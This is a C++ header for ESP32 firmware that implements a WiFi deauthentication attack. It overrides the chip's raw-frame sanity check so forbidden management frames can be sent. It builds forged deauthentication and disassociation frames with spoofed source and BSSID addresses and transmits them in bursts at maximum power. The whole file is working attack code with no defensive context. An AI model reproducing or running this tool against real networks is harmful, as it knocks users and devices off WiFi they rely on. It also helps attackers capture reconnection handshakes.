#ifndef DEAUTH_H
#define DEAUTH_H

#if defined(DEAUTHER)
#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_system.h"

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  if (arg == 31337)
    return 1;
  return 0;
}

// 802.11-Management-Frame
// Offset: 0 FC | 2 Duration | 4 DA | 10 SA | 16 BSSID | 22 Seq | 24 Reason
static const uint8_t deauth_frame_template[] = {
  0xC0, 0x00,                         // Frame Control: Deauthentication
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00,                         // Sequence Control
  0x07, 0x00                          // Reason Code 7
};

void init_deauth_wifi() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  WiFi.disconnect(true);
  WiFi.mode(WIFI_OFF);
  delay(100);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(50);

  esp_wifi_set_promiscuous(true);
  wifi_promiscuous_filter_t filt = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
  };
  esp_wifi_set_promiscuous_filter(&filt);

  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_max_tx_power(78);

  Serial.println(F("WiFi initialized for deauth"));
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
  esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false);
  if (result != ESP_OK) {
    Serial.print(F(" -> Failed to send frame: 0x"));
    Serial.println(result, HEX);
  }
}

void wsl_bypasser_send_deauth_frame(
  uint8_t chan,
  uint8_t *receiverMAC,
  uint8_t *sourceMAC,
  uint8_t *bssidMAC,
  uint8_t frame_type = 0xC0,
  uint16_t reason = 0x0007
) {
  if (esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
    Serial.println(F("Failed to set channel"));
    return;
  }

  uint8_t frame[sizeof(deauth_frame_template)];
  memcpy(frame, deauth_frame_template, sizeof(deauth_frame_template));

  // Frame Control
  frame[0] = frame_type;  // 0xC0 Deauth, 0xA0 Disassoc
  frame[1] = 0x00;

  // Adresses
  memcpy(frame + 4,  receiverMAC, 6);  // DA
  memcpy(frame + 10, sourceMAC,   6);  // SA
  memcpy(frame + 16, bssidMAC,    6);  // BSSID

  // Sequence (Fragment = 0)
  uint16_t seqNum = (uint16_t)(random(0, 4096) << 4);
  frame[22] = seqNum & 0xFF;
  frame[23] = (seqNum >> 8) & 0xFF;

  // Reason
  frame[24] = reason & 0xFF;
  frame[25] = (reason >> 8) & 0xFF;

  for (int i = 0; i < 4; i++) {
    wsl_bypasser_send_raw_frame(frame, sizeof(frame));
    delay(1);
  }
}

#endif
#endif
